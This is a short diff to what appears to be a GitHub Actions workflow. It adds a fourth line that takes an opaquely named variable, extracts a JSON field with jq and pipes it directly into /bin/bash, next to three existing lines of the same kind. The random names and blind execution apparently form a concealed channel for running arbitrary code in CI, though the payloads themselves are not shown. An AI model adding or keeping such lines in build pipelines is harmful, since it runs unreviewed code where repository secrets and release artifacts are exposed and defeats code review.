@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$er5" | jq -r .aw27224 | /bin/bash
           printf '%s' "$c0880" | jq -r .klyeg50641 | /bin/bash
           echo $pboe9 | jq -r .hdxhv12873 | /bin/bash
+          echo $rlydd3395 | jq -r .lw5 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
